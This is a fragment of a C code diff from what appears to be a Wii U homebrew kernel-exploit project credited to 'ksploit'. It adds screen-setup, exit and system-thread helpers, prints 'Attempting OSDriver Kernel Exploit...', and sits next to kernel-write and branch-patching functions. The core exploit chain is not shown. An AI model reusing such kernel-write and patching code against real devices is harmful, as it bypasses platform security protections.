+	unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
+	unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
+
+	//Call the Screen initilzation function.
+	OSScreenInit();
+	//Grab the buffer size for each screen (TV and gamepad)
+	int buf0_size = OSScreenGetBufferSizeEx(0);
+	int buf1_size = OSScreenGetBufferSizeEx(1);
+	//Set the buffer area.
+	OSScreenSetBufferEx(0, (void *)0xF4000000);
+	OSScreenSetBufferEx(1, (void *)0xF4000000 + buf0_size);
+	//Clear both framebuffers.
+	int ii;
+	for (ii = 0; ii < 2; ii++)
+	{
+		fillScreen(0, 0, 0, 0);
+		flipBuffers();
+	}
+	printOSScreenMsg("Attempting OSDriver Kernel Exploit...", 0);
+}
+
+//ksploit's method to exit the current program
+void exitOSScreen(unsigned int coreinit_handle)
+{
+	void(*_Exit)();
+	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
+	//exit only works like this
+	int ii;
+	for (ii = 0; ii < 2; ii++)
+	{
+		fillScreen(0, 0, 0, 0);
+		flipBuffers();
+	}
+	_Exit();
+}
+
+//ksploit's method to set what app the program should exit to
+void callSysExit(unsigned int coreinit_handle, void *sysFunc)
+{
+	void*(*OSAllocFromSystem)(uint32_t size, int align);
+	bool(*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
+	int32_t(*OSResumeThread)(void *thread);
+	int(*OSIsThreadTerminated)(void *thread);
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSIsThreadTerminated", &OSIsThreadTerminated);
+
+	uint32_t stack1 = (uint32_t)OSAllocFromSystem(0x300, 0x20);
+	void *thread1 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
+
+	OSCreateThread(thread1, sysFunc, 0, NULL, stack1 + 0x300, 0x300, 0, 0x1A);
+	OSResumeThread(thread1);
+	while (OSIsThreadTerminated(thread1) == 0)
+	{
+		asm volatile (
+			"    nop\n"
+			"    nop\n"
+			"    nop\n"
+			"    nop\n"
+			"    nop\n"
+			"    nop\n"
+			"    nop\n"
+			"    nop\n"
+			);
+	}
+}
+
 /* Simple memcmp() implementation */
 int memcmp(void *ptr1, void *ptr2, uint32_t length)
 {
@@ -591,6 +727,7 @@ void kern_write(void *addr, uint32_t value)
 			"11", "12"
 		);
 }
+
 u32 PatchB( u32 dst, u32 src )
 {
 	u32 newval = (dst - src);
@@ -598,6 +735,7 @@ u32 PatchB( u32 dst, u32 src )
 	newval|= 0x48000000;
 	return newval;
 }
+
 u32 PatchBL( u32 dst, u32 src )
 {
 	u32 newval = (dst - src);
@@ -605,6 +743,8 @@ u32 PatchBL( u32 dst, u32 src )
 	newval|= 0x48000001;
 	return newval;
 }
+
+/*  //Disabled since we're not using it
 void printChar(char *buf)
 {
 	int i;
@@ -613,4 +753,4 @@ void printChar(char *buf)
 		drawString(0,0,buf);
 		flipBuffers();
 	}
-}
+} */
